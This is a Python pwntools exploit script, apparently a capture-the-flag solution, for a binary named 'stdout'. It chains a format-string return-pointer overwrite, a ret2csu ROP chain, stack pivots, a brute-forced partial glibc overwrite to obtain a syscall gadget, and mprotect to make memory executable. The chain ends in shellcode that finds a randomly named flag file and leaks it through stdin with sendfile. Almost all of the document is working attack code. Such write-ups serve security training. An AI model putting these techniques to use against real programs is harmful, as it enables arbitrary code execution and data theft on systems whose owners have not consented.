#!/usr/bin/env python3

from pwn import *

exe = ELF("./stdout")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
        return process(exe.path, env={"LD_PRELOAD": libc.path})

def s(number):
    return str(number).encode()


def csu_payload(edi, rsi, rdx, rip):
    payload  = b""
    # first stage
    payload += p64(exe.sym['__libc_csu_init'] + 90)
    payload += p64(0) # rbx
    payload += p64(1) #rbp
    payload += p64(edi) #r12
    payload += p64(rsi) #r13
    payload += p64(rdx) #r14
    payload += p64(rip) #r15
    # second stage
    payload += p64(exe.sym['__libc_csu_init'] + 64)
    payload += p64(0)*7
    return payload

def main():
    #r = conn()

    # This challenge is a difficult format string as stdout is closed and cannot be opened again.
    # I leaked the least significant two bytes of the stack, to minimize bruteforcing.
    # The intended solution was :
    # 1)- Change a pointer in the stack to the pointer of printf return pointer.
    # 2)- Change the return pointer to pop 4 times and then our ROP.
    # 3)- The ROP chain will read data to the bss, then pivot there.
    # 4)- Call puts in the fake stack will push some glibc addresses and leave them there (in the bss).
    # 5)- From the ROP chain, call read again and change the least significant two bytes of a glibc address
    #     and make it (syscall; ret), this demand a bruteforce of 1 nibble.
    # 6)- Pivot again in the bss and use mprotect syscall to make the bss (0x404000) RWX and now
    #     you can execute your shellcode.
    # 7)- No execve is allowed and the flag name is randomized in every connection so what you can do is
    #     use opendir(".") and readdir() will give you the filenames and iterate overthem until you find 
    #     the flag, and when found you need to use openat() because open() is not allowed.
    # 8)- Now that you have the fd of the flag and stdout is still closed (I didn't allow any dup* syscall to open it again)
    #     you can use stdin to leak the flag over sockets.
    #     you can use read write syscalls, or just sendfile which is better like this
    #     sendile(0 -stdin-, 3 -flag-, 0 -start-, 0x100 -end-)
    #     or : read(3, 0x404400, 0x100) -> write(0, 0x404400, 0x100)

    r = remote("localhost", 9998)
    r.recvline()
    leak = int(r.recvline().strip(), 16)
    log.warn("leak @ 0x%x", leak)
    
    return_pointer = leak-0x18

    if(return_pointer > (exe.sym.main + 121) & 0xffff):
        r.close()
        return
    
    pop_rsi_r15 = 0x0000000000401441
    pop_four_times = 0x000000000040143c
    pop_rdi = 0x0000000000401443
    pop_rbp = 0x000000000040123d
    leave_ret = 0x00000000004013d6
    stack = 0x404400

    payload  = b"%c"*43 + b"%" + s(return_pointer - 43) + b"c"
    payload += b"%hn"
    payload += b"%" + s(((exe.sym.main + 121) & 0xffff) - return_pointer) + b"c"
    payload += b"%73$hn"

    r.sendline(payload)

    payload  = b"%" + s(pop_four_times & 0xffff) + b"c"
    payload += b"%73$hn" + p32(0)
    payload += csu_payload(0, stack, 0x500, exe.got['read'])
    payload += p64(pop_rbp)
    payload += p64(stack-0x8)
    payload += p64(leave_ret)

    r.sendline(payload)

    fake_stack = p64(pop_rdi) 
    fake_stack += p64(0x404300)
    fake_stack += p64(exe.plt['puts'])
    
    shellcode = asm(f"""
        // r14 will hold the base pointer of libc
        mov r13, 0x4043e8
        mov r14, qword ptr [r13]
        sub r14, 0x870ec


        //Trying to open the current directory.
        mov r13d, 0x2e
        push r13
        mov r11, r14
        add r11, 0xe1000
        mov rdi, rsp
        call r11

        mov r15, rax

        // get the file names in the current directory.
        loop:
            mov r11, r14
            add r11, 0xe1470
            mov rdi, r15

            call r11
            mov r12, rax

            // go to d_name element.
            add r12, 0x13

            // r13 is a pointer to the file name.
            mov r13, r12

            // if the file is 0x80 bytes long, and the extension is .text
            // that will be our flag.
            
            add r12, 0x80
            mov al, byte ptr [r12]
            cmp al, 0x2e
            je osf

            jmp loop

    osf:
       mov rdi, -100
       mov rsi, r13
       xor edx, edx
       xor r10d, r10d
       mov rax, 0x101
       syscall

       mov rdi, 0x0
       mov rsi, rax
       xor edx, edx
       mov r10, 0x100
       mov rax, 0x28
       syscall
       jmp exit

    exit:
        mov rax, 0x3c
        mov rdi, 0x4d
        syscall 
    """)

    # Make a glibc pointer syscall and use it afterwards for mprotect.
    fake_stack += csu_payload(0, 0x4043e0, 0xa, exe.got["read"])
    fake_stack += csu_payload(0x404000, 0x1000, 0x7, 0x4043e8)
    fake_stack += p64(0x404510)
    fake_stack += shellcode
    
    r.sendline(fake_stack)
    
    r.send(p8(0)*8 + p16(0xe0ec)) 

    r.interactive()


if __name__ == "__main__":
    while True:
        try:
            main()
        except:
            pass

